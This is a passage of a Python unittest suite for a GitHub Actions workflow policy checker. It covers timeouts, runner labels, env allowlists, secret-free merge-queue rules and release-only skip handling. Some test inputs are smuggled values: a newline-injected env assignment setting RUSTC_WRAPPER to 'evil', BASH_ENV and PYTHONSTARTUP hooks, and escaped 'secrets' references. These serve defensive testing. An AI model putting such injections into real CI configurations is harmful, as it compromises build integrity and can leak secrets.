        for value in ("0", "-1", "${{ 0 }}", "${{ 30 }}", "true", "1.5", "'5'"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "with a job timeout-minutes:", "not a positive integer literal",
                job=f"timeout-minutes: {value}\n",
            )
        self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), job="timeout-minutes: 10\n")

    def test_step_timeout_must_be_a_positive_integer_literal(self) -> None:
        for value in ("0", "${{ 0 }}", "true", "'5'"):
            extra = f"timeout-minutes: {value}\n"
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, extra),
                "step 'Verify' names", "timeout-minutes", "not a positive integer literal",
            )
            self.job_refused(
                f"- name: Pre\n  uses: {_CHECKOUT}\n  {extra}" + _run("Verify", _TOOL),
                "step 'Verify'", "after step 'Pre'",
            )
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n  timeout-minutes: 5\n" + _run("Verify", _TOOL, "timeout-minutes: 10\n")
        )

    def test_unicode_digit_runner_label_is_refused(self) -> None:
        for runs_on in ("ubuntu-\u0662\u0664", "ubuntu-24.\u0660\u0664", "ubuntu-\uff12\uff14"):
            self.assertIsNone(verify_manifest.RunnerLabel.parse(runs_on))
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "not one literal GitHub-hosted Ubuntu label", runs_on=runs_on,
            )
        for runs_on in ("ubuntu-latest", "ubuntu-24.04", "ubuntu-22.04-arm", "ubuntu-24.04-arm64"):
            self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), runs_on=runs_on)

    def test_role_masking_is_exhaustive_and_verdicts_admit_none(self) -> None:
        vm = verify_manifest
        self.assertEqual(set(vm.ROLE_MASKING), set(vm.ToolRole))
        for masking in vm.ROLE_MASKING.values():
            self.assertLessEqual(masking.step | masking.job, vm.MASKING_KEYS)
            self.assertNotIn("if", masking.step)
            self.assertNotIn("continue-on-error", masking.job)
        verdict = vm.ROLE_MASKING[vm.ToolRole.VERDICT]
        self.assertEqual(verdict.step | verdict.job, frozenset())
        self.assertEqual(vm.TOOL_ROLES.get("verify-manifest.py", vm.ToolRole.VERDICT), vm.ToolRole.VERDICT)

    def test_step_scoped_event_keys_are_refused_outside_one_step(self) -> None:
        for key in ("MERGE_GROUP_BASE_SHA", "RUN_ID"):
            self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, f"env:\n  {key}: x\n"))
            self.job_refused(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), "job env", key, job=f"env:\n  {key}: x\n")
            self.job_refused(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL), key, top=f"env:\n  {key}: x\n")
        for near in ("RUN_IDS", "run_id", "MERGE_GROUP_BASE", "MERGE_GROUP_BASE_SHA_", "GITHUB_RUN_ID"):
            self.job_refused(f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL, f"env:\n  {near}: x\n"), "step 'Verify'", near)

    def test_lane_tool_roles_are_pinned(self) -> None:
        vm = verify_manifest
        self.assertEqual(vm.TOOL_ROLES["change_class.py"], vm.ToolRole.ADVISORY)
        self.assertEqual(vm.TOOL_ROLES["rerun_policy.py"], vm.ToolRole.OUTPUT)
        for verdict in ("prose_guard.py", "e2e_shard.py", "nightly_green.py", "check_required_set.py"):
            self.assertEqual(vm.TOOL_ROLES.get(verdict, vm.ToolRole.VERDICT), vm.ToolRole.VERDICT, verdict)

    def test_advisory_classifier_admits_no_job_if_or_step_if(self) -> None:
        run = "python3 .github/ci/change_class.py --code"
        self.job_accepted(f"- uses: {_CHECKOUT}\n" + _run("Classify", run, "continue-on-error: true\n"))
        self.job_refused(f"- uses: {_CHECKOUT}\n" + _run("Classify", run, "if: always()\n"), "step 'Classify'", "no if:")
        self.job_refused(f"- uses: {_CHECKOUT}\n" + _run("Classify", run), "with a job if:", job="if: always()\n")

    def test_live_masked_tool_jobs_parse_as_output_jobs(self) -> None:
        vm = verify_manifest
        errors: list[str] = []
        wfs = {wf.fname: wf for wf in vm._load_sccache_workflows(vm.REPO_ROOT, errors)}
        self.assertEqual(errors, [])
        for fname, job_id, masking in (
            ("ci.yml", "cancel-on-cheap-red", {"if"}),
            ("rerun-failed-once.yml", "rerun", {"if"}),
            ("ci.yml", "changes", set()),
        ):
            with self.subTest(job=job_id):
                wf = wfs[fname]
                job = next(j for j in wf.jobs if j.job_id == job_id)
                jloc = f"{fname}: job {job_id!r}"
                parsed = vm.ToolJob.parse(wf, job, vm._typed_steps(job.raw, jloc, errors), jloc, vm.REPO_ROOT)
                self.assertIsInstance(parsed, vm.ToolJob, parsed)
                self.assertEqual(parsed.masking, masking)

    # ---- a closed shape's with: is literal --------------------------------

    def test_expression_in_a_closed_with_is_refused(self) -> None:
        for pre in (
            f"- name: Pre\n  uses: {_SETUP_PY}\n  with:\n    python-version: ${{{{ github.head_ref }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    sparse-checkout: ${{{{ inputs.paths }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: '${{{{ inputs.d }}}}'\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: [1]\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    ref: ${{{{ github.event_name == 'push' && '0' || '1' }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: ${{{{ github.head_ref == 'x' && '0' || '1' }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: ${{{{ github.event_name == 'push' && inputs.d || '1' }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: ${{{{ github.event_name == 'push' && '0' || '1' }}}} ${{{{ inputs.d }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: ${{{{ github.event_name == 'push' && 'x' || '1' }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth: |\n      ${{{{ github.event_name == 'push' && '0' || '1' }}}}\n",
            f"- name: Pre\n  uses: {_SETUP_PY}\n  with:\n    fetch-depth: ${{{{ github.event_name == 'push' && '0' || '1' }}}}\n",
            f"- name: Pre\n  uses: {_CHECKOUT}\n  with:\n    fetch-depth:\n",
        ):
            self.job_refused(pre + _run("Verify", _TOOL), "step 'Verify'", "after step 'Pre'")

    def test_literal_closed_with_passes(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n  with:\n    fetch-depth: 2\n    persist-credentials: false\n"
            f"- uses: {_SETUP_PY}\n  with:\n    python-version: 3.12\n"
            + _run("Verify", _TOOL)
        )

    def test_event_keyed_fetch_depth_passes(self) -> None:
        self.job_accepted(
            f"- uses: {_CHECKOUT}\n  with:\n"
            f"    fetch-depth: ${{{{ github.event_name == 'merge_group' && '0' || '2' }}}}\n"
            + _run("Verify", _TOOL)
        )

    # ---- a working directory is a typed plain path ------------------------

    def test_working_directory_with_a_control_character_is_refused_before_the_filesystem(self) -> None:
        for wd in ("a\x00b", "a\rb", "a\x1bb", "a b", "sub\n"):
            with self.subTest(wd=wd):
                self.assertEqual(
                    verify_manifest.WorkingDir.parse(wd, self.fx.repo),
                    "holds a control or non-printing character",
                )

    def test_working_directory_with_a_tilde_has_its_own_refusal(self) -> None:
        for wd in ("~", "~/x", "a/~b", "GITHUB~1"):
            with self.subTest(wd=wd):
                self.assertIn("`~` component", str(verify_manifest.WorkingDir.parse(wd, self.fx.repo)))
            self.job_refused(
                _run("Build", "cargo build", f"working-directory: {json.dumps(wd)}\n"), "`~` component",
            )

    def test_non_string_working_directory_is_refused(self) -> None:
        for wd, kind in (("5", "int"), ("[a]", "list"), ("{a: b}", "dict"), ("true", "bool")):
            self.job_refused(
                _run("Build", "cargo build", f"working-directory: {wd}\n"), f"is not a string ({kind})",
            )
            self.job_refused(
                _run("Build", "cargo build"), f"is not a string ({kind})",
                job=f"defaults:\n  run:\n    working-directory: {wd}\n",
            )

    def test_plain_working_directory_parses(self) -> None:
        self.assertEqual(verify_manifest.WorkingDir.parse("src/x", self.fx.repo), verify_manifest.WorkingDir("src/x"))

    # ---- a tool job's defaults and workflow env ---------------------------

    def test_tool_job_under_a_non_bash_default_shell_is_refused(self) -> None:
        for shell in ("pwsh", "sh", "python"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "job defaults.run.shell", "a tool run is read as bash",
                job=f"defaults:\n  run:\n    shell: {shell}\n",
            )
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "workflow defaults.run.shell", "a tool run is read as bash",
                top=f"defaults:\n  run:\n    shell: {shell}\n",
            )

    def test_unadmitted_workflow_env_key_in_a_tool_job_is_refused(self) -> None:
        for key in ("FOO", "gh_token", "BASH_ENV", "PYTHONSTARTUP"):
            self.job_refused(
                f"- uses: {_CHECKOUT}\n" + _run("Verify", _TOOL),
                "workflow env", key, "outside the tool env allowlist",
                top=f"env:\n  {key}: x\n",
            )


class TestSsotOutputTools(unittest.TestCase):
    """The SSOT-publishing tools fail closed on a malformed SSOT: exit 1 and
    write no output, so a consumer keeps its fail-safe default."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.dir = self._tmpdir.name
        for name in ("deterministic_checks_output.py", "check_required_set.py", "strict_yaml.py", "gha_expr.py"):
            with open(os.path.join(HERE, name), encoding="utf-8") as src:
                _write(os.path.join(self.dir, name), src.read())
        self.output = os.path.join(self.dir, "github-output")

    def put(self, name: str, content: bytes | None) -> None:
        path = os.path.join(self.dir, name)
        if content is None:
            if os.path.exists(path):
                os.remove(path)
            return
        with open(path, "wb") as f:
            f.write(content)

    def run_tool(self, name: str) -> tuple[int, str, str]:
        import subprocess

        open(self.output, "w").close()
        env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "GITHUB_OUTPUT": self.output}
        proc = subprocess.run(
            [sys.executable, os.path.join(self.dir, name)], env=env, capture_output=True, text=True, check=False,
        )
        return proc.returncode, proc.stdout, proc.stderr

    def assertFailsClosed(self, name: str) -> None:
        rc, stdout, stderr = self.run_tool(name)
        self.assertEqual(rc, 1)
        self.assertEqual(stdout, "")
        # A refusal, not a crash that happens to exit 1.
        self.assertNotIn("Traceback", stderr)
        self.assertNotEqual(stderr, "")
        with open(self.output, encoding="utf-8") as f:
            self.assertEqual(f.read(), "")

    def test_deterministic_checks_output_publishes_a_valid_ssot(self) -> None:
        self.put("deterministic-checks.json", b'{"checks": [{"context": "c", "step": "s"}]}')
        rc, _, _ = self.run_tool("deterministic_checks_output.py")
        self.assertEqual(rc, 0)
        with open(self.output, encoding="utf-8") as f:
            self.assertEqual(f.read(), 'checks=[{"context":"c","step":"s"}]\n')

    def test_deterministic_checks_output_refuses_a_malformed_ssot(self) -> None:
        for content in (
            None, b"", b"{", b"\xff\xfe", b"[]", b'{"checks": []}', b'{"checks": {}}',
            b'{"checks": [1]}', b'{"checks": [{"context": 1, "step": "s"}]}',
            b'{"checks": [{"context": "c"}]}', b'{"checks": [{"context": "c", "step": "s", "x": 1}]}',
        ):
            with self.subTest(content=content):
                self.put("deterministic-checks.json", content)
                self.assertFailsClosed("deterministic_checks_output.py")

    def test_check_required_set_passes_a_matching_pair(self) -> None:
        self.put("check-manifest.yml", b"checks:\n- context: a\n  disposition: gate\n")
        self.put("required-set.json", b'["a"]')
        self.assertEqual(self.run_tool("check_required_set.py")[0], 0)

    def test_check_required_set_refuses_a_malformed_manifest(self) -> None:
        self.put("required-set.json", b'["a"]')
        for content in (
            None, b"", b"\xff\xfe", b"[]", b"checks: 5\n", b"checks:\n- 5\n", b"checks:\n- context: a\n",
            b"checks:\n- context: 1\n  disposition: gate\n", b"checks: [\n", b"checks: []\nchecks: []\n",
        ):
            with self.subTest(content=content):
                self.put("check-manifest.yml", content)
                self.assertFailsClosed("check_required_set.py")

    def test_check_required_set_refuses_a_malformed_required_set(self) -> None:
        self.put("check-manifest.yml", b"checks:\n- context: a\n  disposition: gate\n")
        for content in (None, b"", b"{", b"\xff\xfe", b"{}", b"[1]", b'"a"'):
            with self.subTest(content=content):
                self.put("required-set.json", content)
                self.assertFailsClosed("check_required_set.py")


class TestGithubEnvHelper(unittest.TestCase):
    """The helper re-checks its own contract at run time (defence in depth)."""

    HELPER = os.path.join(HERE, "github-env.sh")

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.env_file = os.path.join(self._tmpdir.name, "env")
        open(self.env_file, "w").close()

    def run_helper(self, *args: str) -> int:
        import subprocess

        env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "GITHUB_ENV": self.env_file}
        return subprocess.run(["bash", self.HELPER, *args], env=env, capture_output=True, check=False).returncode

    def written(self) -> str:
        with open(self.env_file) as f:
            return f.read()

    def test_allowlisted_key_is_written(self) -> None:
        self.assertEqual(self.run_helper("CI_JOB_BIN_NAME", "ipe"), 0)
        self.assertEqual(self.written(), "CI_JOB_BIN_NAME=ipe\n")

    def test_refusals_write_nothing(self) -> None:
        for args in (
            ("OTHER_KEY", "x"),
            ("CI_JOB_OTHER", "x"),
            ("CI_JOB_", "x"),
            ("RUSTC_WRAPPER", "sccache"),
            ("ci_job_bin_name", "x"),
            ("BIN_NAME", "x"),
            ("# Keys", "x"),
            ("CI_JOB_BIN_NAME", "ipe\nRUSTC_WRAPPER=evil"),
            ("CI_JOB_BIN_NAME", "ipe\r"),
            ("CI_JOB_BIN_NAME",),
            ("CI_JOB_BIN_NAME", "a", "b"),
        ):
            with self.subTest(args=args):
                self.assertNotEqual(self.run_helper(*args), 0)
                self.assertEqual(self.written(), "")


class TestDeterministicSetMasking(unittest.TestCase):
    """A deterministic check step runs unmasked, and its job's failure is
    never ignored (a job-level `if:` only skips, which never fires the
    cancel)."""

    def errors_for(self, job_extra: str, step_extra: str = "") -> list[str]:
        vm = verify_manifest
        with tempfile.TemporaryDirectory() as tmp:
            _write(
                os.path.join(tmp, "workflows", "ci.yml"),
                "name: ci\non: push\njobs:\n"
                "  clippy:\n    runs-on: ubuntu-latest\n" + textwrap.indent(job_extra, "    ")
                + "    steps:\n      - name: Run clippy\n        run: cargo clippy\n"
                + textwrap.indent(step_extra, "        "),
            )
            jobs = [
                vm.Job("ci.yml", "clippy", ["clippy"], []),
                vm.Job("ci.yml", vm.CANCEL_WATCHER_JOB_ID, ["cancel"], ["clippy"]),
            ]
            errors: list[str] = []
            with mock.patch.object(vm, "REPO_ROOT", tmp), mock.patch.object(
                vm, "load_deterministic_checks", lambda errs: [("clippy", "Run clippy")]
            ):
                vm.check_deterministic_set(jobs, errors)
            return errors

    def test_unmasked_check_and_a_path_filter_if_pass(self) -> None:
        self.assertEqual(self.errors_for(""), [])
        self.assertEqual(self.errors_for("if: needs.changes.outputs.code == 'true'\n"), [])

    def test_job_level_continue_on_error_is_refused(self) -> None:
        for value in ("true", "${{ true }}", "false"):
            with self.subTest(value=value):
                errors = self.errors_for(f"continue-on-error: {value}\n")
                self.assertTrue(any("job-level `continue-on-error:`" in e for e in errors), errors)

    def test_masked_check_step_is_refused(self) -> None:
        for extra in ("if: always()\n", "continue-on-error: true\n"):
            with self.subTest(extra=extra):
                errors = self.errors_for("", extra)
                self.assertTrue(any("must run unconditionally" in e for e in errors), errors)


_MQ_OK = """\
on:
  push:
    branches: [main]
  pull_request:
  merge_group:
permissions:
  contents: read
jobs:
  full:
    runs-on: ubuntu-latest
    if: needs.changes.outputs.code == 'true' || (github.event_name != 'pull_request' && github.event_name != 'merge_group')
    steps:
      - run: echo full
  cancel:
    runs-on: ubuntu-latest
    if: >-
      failure() &&
      github.event_name == 'pull_request' &&
      github.event.pull_request.head.repo.full_name == github.repository
    permissions:
      actions: write
    steps:
      - run: echo cancel
"""


class TestMergeQueueSafety(unittest.TestCase):
    """Check 8: gate producers run under the merge queue, and every
    merge_group workflow stays secret-free, read-only, and on the PR tier."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.fx = SccacheFixture(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def errors(self, content: str, *, gates: set[str] | None = None) -> list[str]:
        self.fx.workflow("gate.yml", content)
        errors: list[str] = []
        check_merge_queue({"gate.yml"} if gates is None else gates, errors, root=self.fx.root)
        return errors

    def assertRefused(self, content: str, needle: str, **kw: object) -> None:
        errors = self.errors(content, **kw)  # type: ignore[arg-type]
        self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    def test_valid_workflow_passes(self) -> None:
        self.assertEqual(self.errors(_MQ_OK), [])

    def test_gate_producer_without_merge_group_refused(self) -> None:
        self.assertRefused(_MQ_OK.replace("  merge_group:\n", ""), "does not trigger on `merge_group`")

    def test_gate_producer_without_pull_request_refused(self) -> None:
        self.assertRefused(_MQ_OK.replace("  pull_request:\n", ""), "does not trigger on `pull_request`")

    def test_missing_gate_producer_file_refused(self) -> None:
        self.assertRefused(_MQ_OK, "has no workflow file", gates={"gate.yml", "gone.yml"})

    def test_secret_reference_refused(self) -> None:
        bad = _MQ_OK.replace("run: echo full", "run: echo ${{ SECRETS.TOKEN }}")
        self.assertRefused(bad, "must be secret-free")

    def test_secrets_inherit_refused(self) -> None:
        bad = _MQ_OK + "  reuse:\n    uses: ./.github/workflows/x.yml\n    secrets: inherit\n"
        self.assertRefused(bad, "must be secret-free")

    def test_pull_request_target_touching_head_refused(self) -> None:
        bad = _MQ_OK.replace("  merge_group:\n", "  merge_group:\n  pull_request_target:\n")
        self.assertRefused(bad, "only when it runs no head code")

    def test_head_free_pull_request_target_admitted(self) -> None:
        self.assertEqual(self.errors(_PRT_OK), [])

    def test_missing_top_level_permissions_refused(self) -> None:
        bad = _MQ_OK.replace("permissions:\n  contents: read\n", "")
        self.assertRefused(bad, "must declare top-level `permissions:`")

    def test_top_level_write_scope_refused(self) -> None:
        bad = _MQ_OK.replace("  contents: read\n", "  contents: write\n", 1)
        self.assertRefused(bad, "must be read-only")

    def test_top_level_write_all_refused(self) -> None:
        bad = _MQ_OK.replace("permissions:\n  contents: read\n", "permissions: write-all\n")
        self.assertRefused(bad, "must be read-only")

    def test_job_write_scope_without_pr_only_if_refused(self) -> None:
        bad = _MQ_OK.replace("      github.event_name == 'pull_request' &&\n", "")
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_behind_a_disjunction_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event_name == 'pull_request' &&\n",
            "      github.event_name == 'pull_request' || github.event_name == 'merge_group' &&\n",
        )
        self.assertRefused(bad, "holds a write scope")

    def test_bare_pr_tier_test_refused(self) -> None:
        bad = _MQ_OK.replace(
            "(github.event_name != 'pull_request' && github.event_name != 'merge_group')",
            "github.event_name != 'pull_request'",
        )
        self.assertRefused(bad, "a merge-group run would take the full tier")

    def test_non_gate_workflow_without_merge_group_is_not_checked(self) -> None:
        bad = _MQ_OK.replace("  merge_group:\n", "").replace("run: echo full", "run: echo ${{ secrets.X }}")
        self.assertEqual(self.errors(bad, gates=set()), [])

    def test_hex_escaped_secrets_refused(self) -> None:
        bad = _MQ_OK.replace("run: echo full", 'run: "echo ${{ \\x73ecrets.TOKEN }}"')
        self.assertRefused(bad, "must be secret-free")

    def test_unicode_escaped_secrets_refused(self) -> None:
        bad = _MQ_OK.replace("run: echo full", 'run: "echo ${{ \\u0073ecrets.TOKEN }}"')
        self.assertRefused(bad, "must be secret-free")

    def test_escaped_secrets_key_refused(self) -> None:
        bad = _MQ_OK + '  reuse:\n    uses: ./.github/workflows/x.yml\n    "\\x73ecrets": inherit\n'
        self.assertRefused(bad, "must be secret-free")

    def test_job_write_scope_under_negation_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event_name == 'pull_request' &&\n",
            "      !(always() && github.event_name == 'pull_request' && always()) &&\n",
        )
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_inside_nested_group_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event_name == 'pull_request' &&\n",
            "      (github.event_name == 'pull_request' && always()) == false &&\n",
        )
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_with_pr_test_in_string_literal_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event_name == 'pull_request' &&\n",
            "      contains('x && github.event_name == ''pull_request'' && y', 'x') &&\n",
        )
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_with_unbalanced_parens_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event_name == 'pull_request' &&\n",
            "      github.event_name == 'pull_request' && ( &&\n",
        )
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_in_expression_wrapper_passes(self) -> None:
        ok = _MQ_OK.replace(
            "    if: >-\n      failure() &&\n      github.event_name == 'pull_request' &&\n",
            "    if: ${{ failure() && github.event_name == 'pull_request' &&\n",
        ).replace(
            "      github.event.pull_request.head.repo.full_name == github.repository\n",
            "      github.event.pull_request.head.repo.full_name == github.repository }}\n",
        )
        self.assertNotEqual(ok, _MQ_OK)
        self.assertEqual(self.errors(ok), [])

    def test_job_write_scope_with_trailing_partial_expression_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      github.event.pull_request.head.repo.full_name == github.repository\n",
            "      ${{ true }}\n",
        )
        self.assertNotEqual(bad, _MQ_OK)
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_scope_with_split_partial_expressions_refused(self) -> None:
        bad = _MQ_OK.replace(
            "      failure() &&\n",
            "      ${{ always() }} &&\n",
        ).replace(
            "      github.event.pull_request.head.repo.full_name == github.repository\n",
            "      ${{ true }}\n",
        )
        self.assertNotEqual(bad, _MQ_OK)
        self.assertRefused(bad, "holds a write scope")

    def test_job_write_all_refused(self) -> None:
        bad = _MQ_OK.replace("    permissions:\n      actions: write\n", "    permissions: write-all\n").replace(
            "      github.event_name == 'pull_request' &&\n", ""
        )
        self.assertRefused(bad, "holds a write scope")

    def test_list_form_on_without_merge_group_refused(self) -> None:
        bad = _MQ_OK.replace(
            "on:\n  push:\n    branches: [main]\n  pull_request:\n  merge_group:\n", "on: [push, pull_request]\n"
        )
        self.assertRefused(bad, "does not trigger on `merge_group`")

    def test_reversed_bare_pr_tier_test_refused(self) -> None:
        bad = _MQ_OK.replace(
            "(github.event_name != 'pull_request' && github.event_name != 'merge_group')",
            "'pull_request' != github.event_name",
        )
        self.assertRefused(bad, "a merge-group run would take the full tier")

    def test_unrecognised_on_shape_refused(self) -> None:
        bad = _MQ_OK.replace("on:\n  push:\n    branches: [main]\n  pull_request:\n  merge_group:\n", "on: 3\n")
        self.assertRefused(bad, "`on:` is not")


_RO_OK = """\
on: [pull_request, merge_group]
permissions:
  contents: read
jobs:
  changes:
    runs-on: ubuntu-latest
    steps:
      - run: echo classify
  heavy:
    name: heavy (${{ matrix.os }})
    strategy:
      matrix:
        os: [linux]
    runs-on: ubuntu-latest
    needs: [changes]
    if: >-
      needs.changes.outputs.code == 'true'
      || needs.changes.outputs.release_only == 'true'
    steps:
      - name: Release-only diff - trivial pass
        if: needs.changes.outputs.release_only == 'true'
        run: echo "release-only diff; trivial pass, not a skip."
      - if: needs.changes.outputs.release_only != 'true'
        run: cargo build
"""

_RO_SKIP_IF = (
    "    if: >-\n"
    "      needs.changes.outputs.code == 'true'\n"
    "      || needs.changes.outputs.release_only == 'true'\n"
)


class TestReleaseOnlySkipAsPass(unittest.TestCase):
    """Check 9: a gate producer never skips on `release_only`; it runs and
    reports the release-only pass through an executed step."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.fx = SccacheFixture(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def errors(self, content: str, *, gates: set[str] | None = None) -> list[str]:
        self.fx.workflow("gate.yml", content)
        errors: list[str] = []
        check_release_only_skips({"heavy (linux)"} if gates is None else gates, errors, root=self.fx.root)
        return errors

    def assertRefused(self, content: str, needle: str) -> None:
        errors = self.errors(content)
        self.assertTrue(any(needle in e for e in errors), f"expected {needle!r} in {errors}")

    def with_if(self, cond: str) -> str:
        assert _RO_SKIP_IF in _RO_OK
        return _RO_OK.replace(_RO_SKIP_IF, f"    if: {cond}\n")

    def test_genuine_trivial_pass_passes(self) -> None:
        self.assertEqual(self.errors(_RO_OK), [])

    def test_no_release_only_mention_with_unconditional_step_passes(self) -> None:
        ok = self.with_if("needs.changes.outputs.code == 'true'").replace(
            "      - if: needs.changes.outputs.release_only != 'true'\n        run: cargo build\n",
            "      - run: cargo build\n",
        )
        self.assertEqual(self.errors(ok), [])

    def test_all_steps_conditional_without_release_only_disjunct_refused(self) -> None:
        bad = self.with_if("needs.changes.outputs.code == 'true'").replace(
            "needs.changes.outputs.release_only", "matrix.os"
        )
        self.assertNotIn("release_only", bad.split("jobs:")[1].split("heavy:")[1])
        self.assertRefused(bad, "every step carries an `if:`")

    def test_step_level_only_release_only_skip_refused(self) -> None:
        bad = self.with_if("needs.changes.outputs.code == 'true'").replace(
            "      - name: Release-only diff - trivial pass\n"
            "        if: needs.changes.outputs.release_only == 'true'\n"
            "        run: echo \"release-only diff; trivial pass, not a skip.\"\n",
            "",
        )
        self.assertRefused(bad, "every step carries an `if:`")

    def test_release_only_case_variant_refused(self) -> None:
        bad = self.with_if(
            "(needs.changes.outputs.code == 'true') && needs.Changes.outputs.RELEASE_ONLY != 'true'"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_bracket_release_only_refused(self) -> None:
        bad = self.with_if(
            "(needs.changes.outputs.code == 'true') && needs.changes.outputs['release_only'] != 'true'"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_reexported_release_only_output_refused(self) -> None:
        aliased = _RO_OK.replace(
            "  changes:\n    runs-on: ubuntu-latest\n",
            "  changes:\n    runs-on: ubuntu-latest\n"
            "    outputs:\n      skip_heavy: ${{ steps.release.outputs.release_only }}\n",
        ).replace(
            "  heavy:\n",
            "  relay:\n    runs-on: ubuntu-latest\n    needs: [changes]\n"
            "    outputs:\n      quiet: ${{ needs.changes.outputs.Skip_Heavy }}\n"
            "    steps:\n      - run: echo relay\n"
            "  heavy:\n",
        )
        self.assertNotEqual(aliased, _RO_OK)
        for skip in ("needs.changes.outputs.skip_heavy", "needs.relay.outputs.quiet"):
            bad = aliased.replace(_RO_SKIP_IF, f"    if: (needs.changes.outputs.code == 'true') && {skip} != 'true'\n")
            self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_non_gate_job_may_skip(self) -> None:
        bad = self.with_if("needs.changes.outputs.release_only != 'true'")
        self.assertEqual(self.errors(bad, gates={"other"}), [])

    def test_release_only_skip_conjunct_refused(self) -> None:
        bad = self.with_if(
            "(needs.changes.outputs.code == 'true') && needs.changes.outputs.release_only != 'true'"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_release_only_skip_on_matrix_leg_refused(self) -> None:
        bad = self.with_if("needs.changes.outputs.release_only != 'true'")
        self.assertRefused(bad, "gate producer job 'heavy'")

    def test_negated_release_only_refused(self) -> None:
        bad = self.with_if("${{ !(needs.changes.outputs.release_only == 'true') }}")
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_release_only_disjunct_nested_under_conjunct_refused(self) -> None:
        bad = self.with_if(
            "(needs.changes.outputs.code == 'true' || needs.changes.outputs.release_only == 'true') && always()"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_second_release_only_mention_refused(self) -> None:
        bad = self.with_if(
            "needs.changes.outputs.release_only == 'true' || "
            "(needs.changes.outputs.code == 'true' && needs.changes.outputs.release_only != 'true')"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_unbalanced_if_refused(self) -> None:
        bad = self.with_if("(needs.changes.outputs.code == 'true' || needs.changes.outputs.release_only == 'true'")
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_partial_expression_wrapper_refused(self) -> None:
        bad = self.with_if(
            "x ${{ needs.changes.outputs.code == 'true' }} || needs.changes.outputs.release_only == 'true'"
        )
        self.assertRefused(bad, "may name `release_only` only as one top-level")

    def test_missing_trivial_pass_step_refused(self) -> None:
        bad = _RO_OK.replace(
            "      - name: Release-only diff - trivial pass\n"
            "        if: needs.changes.outputs.release_only == 'true'\n"
            "        run: echo \"release-only diff; trivial pass, not a skip.\"\n",
            "",
        )
        self.assertRefused(bad, "first step is not the trivial-pass")

    def test_trivial_pass_step_not_first_refused(self) -> None:
        bad = _RO_OK.replace(
            "    steps:\n", "    steps:\n      - if: needs.changes.outputs.release_only != 'true'\n        run: make\n"
        )
        self.assertRefused(bad, "first step is not the trivial-pass")

    def test_trivial_pass_step_without_run_refused(self) -> None:
        bad = _RO_OK.replace(
            "        run: echo \"release-only diff; trivial pass, not a skip.\"\n",
            "        uses: actions/checkout@v7\n",
        )
        self.assertRefused(bad, "first step is not the trivial-pass")

    def test_trivial_pass_step_on_wrong_condition_refused(self) -> None:
        bad = _RO_OK.replace(
            "      - name: Release-only diff - trivial pass\n        if: needs.changes.outputs.release_only == 'true'\n",
            "      - name: Release-only diff - trivial pass\n        if: needs.changes.outputs.code == 'true'\n",
        )
        self.assertRefused(bad, "first step is not the trivial-pass")


_FG_OK = textwrap.dedent(
    """\
    on: [pull_request]
    jobs:
      changes:
        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      fmt:
        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      clippy:
        needs: changes
        runs-on: ubuntu-latest
        steps: [{run: "true"}]
      manifest-lock-consistency:
